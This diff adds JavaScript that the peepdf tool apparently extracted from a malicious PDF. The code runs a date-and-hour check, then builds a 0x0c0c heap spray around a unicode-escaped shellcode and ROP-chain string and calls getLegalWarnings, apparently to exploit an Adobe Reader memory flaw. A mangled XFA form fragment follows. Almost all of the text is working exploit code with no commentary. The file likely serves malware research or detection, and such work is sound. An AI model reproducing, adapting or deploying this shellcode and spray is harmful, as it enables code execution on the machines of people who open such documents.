@@ -1,0 +1,88 @@
+// peepdf comment: Javascript code located in object 106 (version 0)
+
+this.nocache = true;
+
+// peepdf comment: Javascript code located in object 64 (version 1)
+
+var date_flag = 0,
+    time_flag = 0;
+var cur_date = util.printd("d.m.yy", new Date());
+var cur_hr = util.printd("H", new Date());
+if ("everyday".toLowerCase().replace(/ /g, '') == "everyday") {
+    date_flag = 1;
+} else {
+    var arr = "everyday".split(",");
+    for (var i in arr) {
+        if (arr[i].replace(/ /g, '') == cur_date) {
+            date_flag = 1;
+            break;
+        }
+    }
+}
+if ("0,1,2,3,4,5,6,7,10,11,12,13,14,15,16,17,18,19,20,21,22,23".toLowerCase().replace(/ /g, '') == "anytime") {
+    time_flag = 1;
+} else {
+    var arr = "0,1,2,3,4,5,6,7,10,11,12,13,14,15,16,17,18,19,20,21,22,23".split(",");
+    for (var i in arr) {
+        arr[i] = arr[i].replace(/ /g, '');
+        if (arr[i].indexOf(">=") >= 0) {
+            time_flag = 1;
+            // if any condition doesn't hold, don't proceed.
+            if (!(cur_hr >= parseInt(arr[i].split(">=")[1]))) {
+                time_flag = 0;
+                break;
+            }
+        } else if (arr[i].indexOf(">") >= 0) {
+            time_flag = 1;
+            // if any condition doesn't hold, don't proceed.
+            if (!(cur_hr > parseInt(arr[i].split(">")[1]))) {
+                time_flag = 0;
+                break;
+            }
+        }
+        if (arr[i].indexOf("<=") >= 0) {
+            time_flag = 1;
+            // if any condition doesn't hold, don't proceed.
+            if (!(cur_hr <= parseInt(arr[i].split("<=")[1]))) {
+                time_flag = 0;
+                break;
+            }
+        } else if (arr[i].indexOf("<") >= 0) {
+            time_flag = 1;
+            // if any condition doesn't hold, don't proceed.
+            if (!(cur_hr < parseInt(arr[i].split("<")[1]))) {
+                time_flag = 0;
+                break;
+            }
+        }
+        if (cur_hr == parseInt(arr[i])) {
+            time_flag = 1;
+            break;
+        }
+    }
+}
+if (date_flag && time_flag) {
+
+    var shellcode = unescape("%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%uc3dd%u67b8%u3445%ud943%u2474%u5df4%uc931%u3bb1%uc583%u3104%u1545%u4503%u8515%uc8b0%ucbab%u313b%uab2c%ud4b2%ueb1d%u9da1%udb0e%uf0a2%u90a2%ue0e7%ud431%u062f%u52f1%u2916%uce02%u286a%u0c80%u8abf%udfb9%ucbb2%u3dfe%u993e%u4a57%u0eed%u06d3%ua42e%u87af%u5936%ua667%ucc17%uf1f3%ueeb7%u8ad0%ue8f1%ub635%u8248%u4d8e%u424b%uaedf%uabe0%u5def%uecf8%ubdc8%u048f%u402b%ud288%u9e51%uc11d%u55f2%u2d85%uba02%ua550%u7708%ue116%u860c%u99fb%u0329%u4dfa%u57b8%u49d9%u0ce0%ucb40%ue34c%u0b7d%u5c2f%u47d8%u89c2%u0a51%u4c89%u30e7%u4eff%u3af7%u2650%ub1c6%u313f%u13d7%ucd04%u3e9d%u452d%uab78%u086f%u017b%u34b3%ua0f8%uc34c%uc0e0%u8849%u39a6%u8120%u3e42%ua297%u4e46%u2b78%udd0c%ubbf5%u4dab%u1596%uf651%u4903%u63ca%ua4b8%u04af%uc22e%ub54a%u0ada%u0cb1%u3c4d%uda83%u90dc%u91af%u62bd%u2639%uac36%ubecd%u90c2%u5665%u412b");
+
+    var c = unescape("%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c");
+    while (c.length + 20 + 8 < 0x10000) c += c;
+    b = c.substring(0, (0x0c0c - 0x24) / 2);
+    b += shellcode;
+    b += c;
+    d = b.substring(0, 0x10000 / 2);
+    while (d.length < 0x80000) d += d;
+    var_3 = d.substring(0, 0x80000 - (0x1020 - 0x08) / 2);
+    var var_4 = new Array();
+    for (i = 0; i < 0x1f0; i++) var_4[i] = var_3 + "s";
+
+    this.getLegalWarnings(true);
+}
+
+// peepdf comment: Javascript code located in object 121 (version 1)
+
+<? xml version = '1.0' ?> < xdp: xdp xmlns: xdp = 'http://ns.adobe.com/xdp/' > < config xmlns: xfa = 'http://www.xfa.org/schema/xci/3.0/' > < present > < pdf > < interactive > 1 < /interactive></pdf > < /present></config > < template xmlns: xfa = 'http://www.xfa.org/schema/xfa-template/3.0/' > < subform layout = 'tb'
+name = 'form1' > < pageSet / > < event activity = 'initialize'
+name = 'event__ready' > < script contentType = 'application/x-formcalc' > < /script></event > < subform > < field name = 'Button1' > < ui > < button highlight = 'inverted' / > < /ui><caption><value><text>Send!</text > < /value><para hAlign='center' vAlign='middle'/ > < /caption><bind match='none'/ > < event activity = 'click'
+name = 'event__click' > < script contentType = 'application/x-formcalc' > < /script></event > < /field><field name='TextField1'><ui><textEdit><border><edge stroke='lowered'/ > < /border></textEdit > < /ui></field > < /subform></subform > < /template><xfa:datasets xmlns:xfa='http:/ / www.xfa.org / schema / xfa - data / 1.0 / '><xfa:data><form1><TextField1>$host.messageBox("Greetings from Mars!")</TextField1></form1></xfa:data></xfa:datasets></xdp:xdp>
+
